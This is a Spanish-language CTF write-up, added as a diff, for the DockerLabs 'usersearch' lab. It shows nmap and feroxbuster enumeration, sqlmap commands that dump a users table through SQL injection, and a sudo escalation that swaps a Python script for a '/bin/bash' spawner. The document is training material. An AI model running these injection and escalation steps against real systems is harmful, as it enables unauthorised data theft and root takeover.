@@ -1,0 +1,105 @@
+<p><img src="assets/usersearch/portada.png" alt="portada" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="DockerLabs">DockerLabs</a> aprendemos.</p>
+
+<ul>
+  <li>Scan de puertos</li>
+  <li>sqli</li>
+</ul>
+
+<h2 id="herramientas-y-recursos">Herramientas y recursos</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>feroxbuster</li>
+  <li>sqlmap</li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Lanzamos nmap con los parametros de costumbre en un ctf.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> usersearch 172.18.0.2
+</code></pre></div></div>
+
+<p><a href="/reporte/usersearch.html">reporte</a></p>
+
+<p>Como vemos en el reporte nos encontramos con ssh y el apache accesible.
+Mientras reviso la web nos lanzamos feroxbuster en busca de mas pistas.</p>
+
+<p>Despues de estar pronbando manualmente distintos tipos de inyeccion xss, ssti, sql, no consiguo nada hasta que me da por poner admin.</p>
+
+<p><img src="assets/usersearch/admin.png" alt="admin" /></p>
+
+<p>Como vemos en la imagem nos devuelve un password el cual pruebo con ssh sin exito.
+Me lleva a pensar que hay una bbdd y que solo devuelve el contenido cuando acertamos con el usuario.
+La respuesta de ferox nos encuentra un directorio javascript y un fichero <strong>db.php</strong> el cual debe de ser el encargado de realizar las peticione , como manualmente no puede me lanzo sqlmap.</p>
+
+<p><img src="assets/usersearch/ferox.png" alt="ferox" /></p>
+
+<h2 id="sqli">SQLI</h2>
+
+<p>Este primer comando nos va a buscar todas la bbdd que encuentre.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://172.18.0.2 <span class="nt">--forms</span> <span class="nt">--dbs</span> <span class="nt">--batch</span>
+</code></pre></div></div>
+<p>Revisando la salida del sqlmap leo que la inyeccion se provoca a traves del parametro user.</p>
+
+<p><img src="assets/usersearch/bbdd.png" alt="bbdd" /></p>
+
+<p>Una vez sabemos los nombres de las bbdd nos seguimos metiendo mas a fondo en esta ocasion debemos indicar que queremos ver las tablas de la base de datos que nosotros queramos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://172.18.0.2 <span class="nt">--forms</span> <span class="nt">-D</span> testdb <span class="nt">--tables</span> <span class="nt">--batch</span>
+</code></pre></div></div>
+
+<p><img src="assets/usersearch/tables.png" alt="tablas" /></p>
+
+<p>Como vemos nos encuentra la tabla de users , ahora le hemos de indicar que nos muestre el contenido de dicha tabla que ya esta en columnas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://172.18.0.2 <span class="nt">--forms</span> <span class="nt">-D</span> testdb <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--columns</span> <span class="nt">--batch</span> 
+</code></pre></div></div>
+
+<p><img src="assets/usersearch/columns.png" alt="columns" /></p>
+
+<p>Y por ultimo nos a de mostrar el contenido de las columnas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://172.18.0.2 <span class="nt">--forms</span> <span class="nt">-D</span> testdb <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">-C</span> password,username <span class="nt">--dump</span> <span class="nt">--batch</span>
+</code></pre></div></div>
+
+<p><img src="assets/usersearch/contenido.png" alt="contenido" /></p>
+
+<p>Ya conseguimos leer leer los posibles usuarios y contraseñas.</p>
+
+<h2 id="infiltracion">Infiltracion</h2>
+
+<p>YA habiamos probrado el user admin y no era asi que vamos a probar otro.</p>
+
+<p>Entro con el user kvzlx</p>
+
+<p><img src="assets/usersearch/sudol.png" alt="sudol" /></p>
+
+<p>Como vemos nos deja realizar la escalada con python3.</p>
+
+<p><img src="assets/usersearch/searcbins.png" alt="searchbins" /></p>
+
+<h2 id="escalada-final">Escalada final</h2>
+
+<p>Para convertirnos en root realizo los siguientes pasos.</p>
+
+<ol>
+  <li>Elimino el script que indica sudo</li>
+  <li>Creo uno nuevo con el siguiente contenido.
+    <pre><code class="language-python3">   import os;os.system('/bin/bash')
+</code></pre>
+  </li>
+  <li>Por ultimo ejecuto</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/python3 /home/kvzlx/system_info.py 
+</code></pre></div></div>
+
+<p><img src="assets/usersearch/root.png" alt="root" /></p>
+
+<p>Muchas gracia por leer e interesarte en esto temas.
+Comparte conocimiento.</p>
+
